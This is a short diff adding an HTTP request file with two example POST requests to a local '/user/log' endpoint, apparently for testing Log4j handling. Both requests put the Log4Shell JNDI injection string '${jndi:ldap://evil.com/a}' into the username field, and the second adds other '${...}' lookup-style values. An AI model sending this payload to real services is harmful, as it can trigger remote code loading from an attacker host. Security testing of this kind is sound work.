@@ -1,0 +1,24 @@
+### Simple example request
+POST localhost:8877/user/log
+Content-Type: application/json
+
+{ "username": "${jndi:ldap://evil.com/a}" }
+
+
+### Complex example request
+POST localhost:8877/user/log
+Content-Type: application/json
+
+{
+  "username": "${jndi:ldap://evil.com/a}",
+  "${test}": "HELLO",
+  "${test#2}!!!": {
+    "name": "admin",
+    "age": "${666}"
+  },
+  "country_code": 777
+}
+
+
+
+
